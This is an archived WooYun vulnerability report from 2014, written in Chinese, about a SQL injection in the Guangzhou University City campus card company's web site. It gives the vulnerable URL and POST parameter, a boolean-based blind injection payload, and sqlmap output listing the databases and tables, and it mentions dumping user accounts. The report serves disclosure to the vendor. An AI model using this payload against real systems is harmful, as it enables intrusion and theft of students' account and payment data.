wybug_title: 广州大学城一卡通某站sql注入危及上万学生账户信息
wybug_corp: 广州大学城一卡通有限公司
wybug_status: 已交由第三方合作机构(广东省信息安全测评中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-02-24：	细节已通知厂商并且等待厂商处理中									2014-02-26：	厂商已经确认，细节仅向厂商公开									2014-03-08：	细节向核心白帽子及相关领域专家公开									2014-03-18：	细节向普通白帽子公开									2014-03-28：	细节向实习白帽子公开									2014-04-10：	细节向公众公开  简要描述： 广州大学城一卡通某站sql注入危及上万学生账户信息。请交给cncert处理。 详细说明：  注入地址：www.gzekt.com/YoukeAction_judgeBusiness.action post参数：business.busicode=100010
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: business.busicode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: business.busicode=100010' AND 6142=6142 AND 'IBEB'='IBEB---available databases [5]:[*] GZUPAY[*] INPAY[*] SYS[*] SYSTEM[*] YKT_CURsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: business.busicode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: business.busicode=100010' AND 6142=6142 AND 'IBEB'='IBEB---Database: YKT_CUR[23 tables]+--------------------------------+| TBL_SETTLE_ACCDATE             || TBL_SETTLE_BANK                || TBL_SETTLE_BATCHRPT            || TBL_SETTLE_MENU                || TBL_SETTLE_MERCH               || TBL_SETTLE_MERCH_BANKACC_CHECK || TBL_SETTLE_MERCH_DATADTL       || TBL_SETTLE_MER_ACCDATE         || TBL_SETTLE_OPER                || TBL_SETTLE_PAYDTL              || TBL_SETTLE_PAYNOTICE           || TBL_SETTLE_RPTDTL              || TBL_SETTLE_SYSCONFIG           || TBL_SETTLE_TYPE                || TBL_SETTLE_UNION_YKTUPAY       || TOAD_PLAN_TABLE                || T_ALIPAY_TRANSDTL              || T_AREA                         || T_CUSTOMER                     || T_DEVICE                       || T_RPTPOSLEDGER                 || T_SHOP                         || T_SHOPACC                      |+--------------------------------+
脱几个用户帐号登录。



   漏洞证明：  
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: business.busicode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: business.busicode=100010' AND 6142=6142 AND 'IBEB'='IBEB---available databases [5]:[*] GZUPAY[*] INPAY[*] SYS[*] SYSTEM[*] YKT_CURsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: business.busicode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: business.busicode=100010' AND 6142=6142 AND 'IBEB'='IBEB---Database: YKT_CUR[23 tables]+--------------------------------+| TBL_SETTLE_ACCDATE             || TBL_SETTLE_BANK                || TBL_SETTLE_BATCHRPT            || TBL_SETTLE_MENU                || TBL_SETTLE_MERCH               || TBL_SETTLE_MERCH_BANKACC_CHECK || TBL_SETTLE_MERCH_DATADTL       || TBL_SETTLE_MER_ACCDATE         || TBL_SETTLE_OPER                || TBL_SETTLE_PAYDTL              || TBL_SETTLE_PAYNOTICE           || TBL_SETTLE_RPTDTL              || TBL_SETTLE_SYSCONFIG           || TBL_SETTLE_TYPE                || TBL_SETTLE_UNION_YKTUPAY       || TOAD_PLAN_TABLE                || T_ALIPAY_TRANSDTL              || T_AREA                         || T_CUSTOMER                     || T_DEVICE                       || T_RPTPOSLEDGER                 || T_SHOP                         || T_SHOPACC                      |+--------------------------------+




   修复方案：  过滤   版权声明：转载请注明来源 Mr .LZH@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-02-26 10:29 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现,漏洞造成大量敏感信息泄露，同时存在被进一步入侵提权的可能，危害性较大.影响的数据：中攻击成本：低造成影响：高综合评级为：高，rank：10正在联系相关网站管理单位处置。 最新状态： 暂无
